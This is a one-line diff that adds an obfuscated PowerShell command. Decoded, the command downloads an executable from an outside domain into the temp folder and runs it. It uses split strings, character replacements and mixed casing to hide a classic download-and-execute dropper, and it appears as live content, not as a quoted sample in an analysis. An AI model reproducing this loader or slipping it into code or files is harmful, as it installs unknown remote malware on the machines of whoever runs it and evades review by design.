@@ -1,0 +1,1 @@
+﻿ InvoKe-ExpResSIon (('(Tuadpl='+'Tuae'+'nv:temp+baMf.'+'exe'+'baM)'+';(Ne'+'w-Object System.N'+'et.WebClient).'+'Downloa'+'dF'+'i'+'le'+'(baMhttp:'+'//al'+'on'+'q'+'ood'+'.com/ezeke.'+'exeba'+'M, Tuadpl);Start-P'+'roce'+'s'+'s Tuadpl').rEplaCe('baM',[STrIng][cHAR]39).rEplaCe('Tua','$')) 
